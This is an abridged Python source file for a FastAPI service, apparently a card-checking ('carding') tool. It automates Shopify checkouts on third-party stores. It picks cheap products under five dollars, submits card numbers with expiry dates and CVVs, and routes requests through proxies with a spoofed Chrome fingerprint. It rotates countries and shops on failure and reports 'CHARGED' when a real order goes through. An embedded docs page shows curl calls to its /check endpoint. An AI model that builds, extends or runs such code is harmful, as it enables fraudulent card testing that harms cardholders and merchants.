"""
Real Shopify Checkout API — single-file build.
CHARGED is returned ONLY on Shopify ProcessedReceipt / SuccessfulReceipt.
"""
...
_R = {
    ...
    "pci_build":   re.compile(r'/build/([a-f0-9]+)/'),
...
FALLBACK_ORDER = ["CA","GB","AU","DE","FR","NL","IE","SE","IT","ES","CH","JP","SG","AE"]
...
def pick_addr(country: str) -> Address:
    if country in ADDR: return ADDR[country]
    return ADDR.get(country[:2], ADDR["US"])
...
def extract_session(h: str) -> str:
    m = _R["session"].search(h)
    return html.unescape(m.group(1)).strip('"') if m else ""

# ─────────────────────────── Step 0: product ────────────────────────────
def find_product(client: TLS, shop: str, max_price: float = 5.0) -> Tuple[str, str, str]:
    """Return (variant_id, price, title). Only real products, no fakes."""
...
def cart_to_checkout(client: TLS, shop: str, variant: str) -> Tuple[str, str, str, str]:
    """Returns (checkout_url, checkout_token, session_token, checkout_html)."""
    ...
    ses_tok = extract_session(html_body)
...
def _proposal_body(ses: str, stable: str, variant: str, queue: Optional[str],
    ...
    """Build the Proposal GraphQL body as a real dict → clean JSON."""
    if addr:
        partial = {
...
def run_checkout(shop: str, card_entry: str, proxy: str = "", low: bool = True) -> CheckResult:
    ...
    profile = client.s.impersonate if hasattr(client.s, "impersonate") else "chrome124"
    ...
    try:
        ...
        if m: src = html.unescape(m.group(1)).strip('"')
        ...
        # Step 6 — proposal 3 (address), with country fallback
        addr = pick_addr(ctry)
        ...
        delivery_handle = _g("delivery_handle", resp5) or extract_delivery_handle_json(resp5)
        signed_handles = _R["receipt_id"].findall(resp5)  # dummy — will use helper below
        ...
        # Extract receipt id + session token
        ...
        for poll_num in range(1, 21):
            try:
                ...
                if rtype in ("ProcessedReceipt", "SuccessfulReceipt"):
                    ...
                    result.amount = total
                    # Extract confirmation URL (real receipt URL)
                    try:
                        data = json.loads(pr)
                        rc = data.get("data", {}).get("receipt", {})
                        result.receipt_url = (
                            rc.get("confirmationPage", {}).get("url")
                            or rc.get("orderStatusPageUrl")
                            or ck_url
                        )
                    except Exception:
                        result.receipt_url = ck_url
                    return result
                ...
                if rtype == "FailedReceipt":
                    ...
                    if "CAPTCHA" in code:
                        ...
                        result.status_code = "CAPTCHA_REQUIRED"
                        return result
                    # Site-specific → try different site
...
# ─────────── helpers used above (JSON-safe extraction) ──────────────────
...
_active = 0; _lock = threading.Lock()

app = FastAPI(title="Shopify Real Checkout API", version="1.0.0", docs_url=None, redoc_url=None)
...
def _to_resp(r: CheckResult) -> CheckResp:
    s = r.status.name
    return CheckResp(
        Response=s, Charged="True" if s == "CHARGED" else "False",
        CC=r.card, Price=r.amount, Site=r.shop_url,
        status_code=r.status_code, error=r.error,
        retryable=r.retryable, receipt_url=r.receipt_url,
    )
...
_DOCS = """<!doctype html><html><head><meta charset=utf-8>
...
.ok{color:#34d399}.no{color:#fb7185}</style></head><body>
<h1>Shopify Real-Charge API</h1>
<p>Returns <span class=ok>CHARGED</span> only when Shopify confirms a real order (<code>ProcessedReceipt</code>). No fake responses.</p>
<div class=card><b>GET /health</b><pre>curl https://YOUR-APP.up.railway.app/health</pre></div>
<div class=card><b>GET /check</b><pre>curl "https://YOUR-APP.up.railway.app/check?card=4111111111111111|12|2026|123&url=https://shop.com&proxy=http://user:pass@host:port&low=true"</pre></div>
<div class=card><b>POST /check</b><pre>curl -X POST https://YOUR-APP.up.railway.app/check \\
  -H "Content-Type: application/json" \\
  -d '{"card":"4111111111111111|12|2026|123","shop_url":"https://shop.com","proxy":"http://u:p@host:port","low":true}'</pre></div>
<div class=card><b>Real response</b><pre>{"Response":"CHARGED","Charged":"True","Price":"2.99","status_code":"ORDER_PLACED","receipt_url":"https://shop.com/orders/12345"}</pre></div>
</body></html>"""
...
async def check_get(
    ...
    url:   str = Query(..., description="https://shop.myshopify.com"),
